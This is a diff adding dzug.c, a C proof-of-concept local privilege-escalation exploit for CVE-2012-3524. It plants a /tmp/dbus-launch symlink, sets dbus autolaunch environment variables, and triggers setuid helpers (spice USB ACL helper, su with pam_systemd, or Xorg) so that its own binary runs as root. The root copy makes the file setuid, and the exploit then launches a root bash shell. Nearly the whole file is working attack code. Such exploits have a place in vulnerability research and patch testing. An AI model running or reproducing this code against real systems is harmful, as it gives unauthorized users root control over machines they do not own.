@@ -1,0 +1,115 @@
+/* dzug.c CVE-2012-3524 PoC (C) 2012 Sebastian Krahmer
+ *
+ * Trivial non-dbus root exploit. (Yes, it is 2012!)
+ *
+ * The underlying bug (insecure getenv() by default) has been
+ * reported ages ago, but nobody really cared. Unless you have an
+ * exploit...
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <sys/signal.h>
+#include <sys/stat.h>
+
+
+int main(int argc, char **argv)
+{
+	int i = 0;
+	struct stat st;
+	pid_t pid = 0;
+	char *env[] = {
+	    "PATH=/tmp:/usr/bin:/usr/sbin:/sbin:/bin",
+	    "DBUS_STARTER_BUS_TYPE=system",
+	    "DBUS_SYSTEM_BUS_ADDRESS=autolaunch:",
+	    NULL,
+	    NULL
+	};
+
+
+	/* the pam_systemd vector */
+	char *su[] = {"/bin/su", NULL, "blah", NULL};
+
+	/* the spice vector */
+	char *spice[] = {"/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper", NULL};
+
+	/* the Xorg vector, for older Linux dists and Solaris */
+	char *xorg[] = {"/usr/bin/Xorg", ":7350", NULL};
+
+	char **a = xorg;
+	char *dbus[] = {"/tmp/dbus-launch", NULL};
+	char *sh[] = {"/bin/bash", "--noprofile", "--norc", NULL};
+	char me[0x1000];
+
+	if (geteuid() == 0 && argc > 1) {
+		chown("/tmp/dbus-launch", 0, 0);
+		chmod("/tmp/dbus-launch", 04755);
+		exit(errno);
+	} else if (geteuid() == 0) {
+		setuid(0);
+		execve(*sh, sh, NULL);
+		return errno;
+	}
+
+	printf("[**] CVE-2012-3524 xSports -- this is not a dbus exploit!\n\n[*] Preparing ...\n");
+	memset(me, 0, sizeof(me));
+
+	if (readlink("/proc/self/exe", me, sizeof(me) - 1) < 0) {
+		/* Solaris */
+		readlink("/proc/self/path/a.out", me, sizeof(me) - 1);
+	}
+	symlink(me, "/tmp/dbus-launch");
+
+	if (stat(spice[0], &st) == 0) {
+		if ((st.st_mode & 04000) == 04000) {
+			printf("[+] Using spice helper ...\n");
+			a = spice;
+		}
+	} else if (stat("/lib64/security/pam_systemd.so", &st) == 0) {
+		printf("[+] Using pam_systemd helper (type user passwd when asked) ...\n");
+		env[3] = "DISPLAY=:7350";
+		su[1] = getenv("USER");
+		a = su;
+	} else if (stat(xorg[0], &st) == 0) {
+		if ((st.st_mode & 04000) == 04000)
+			printf("[+] Using Xorg helper ...\n");
+		else {
+			printf("[-] No suitable suid helper found.\n");
+			exit(0);
+		}
+	} else {
+		printf("[-] No suitable suid helper found.\n");
+		exit(0);
+	}
+
+	if ((pid = fork()) == 0) {
+		execve(*a, a, env);
+		exit(0);
+	}
+
+	printf("[*] Waiting 10s for dbus-launch to drop boomshell.\n");
+
+	for (i = 0; i < 10; ++i) {
+		sleep(1);
+		printf("."); fflush(stdout);
+	}
+	kill(pid, SIGKILL);
+	waitpid(pid, NULL, 0);
+
+	for (;;) {
+		stat(*dbus, &st);
+		if ((st.st_mode & 04755) == 04755)
+			break;
+		sleep(1);
+	}
+	printf("\n[!] Hurra!\n");
+
+	execve(*dbus, dbus, NULL);
+	return errno;
+}
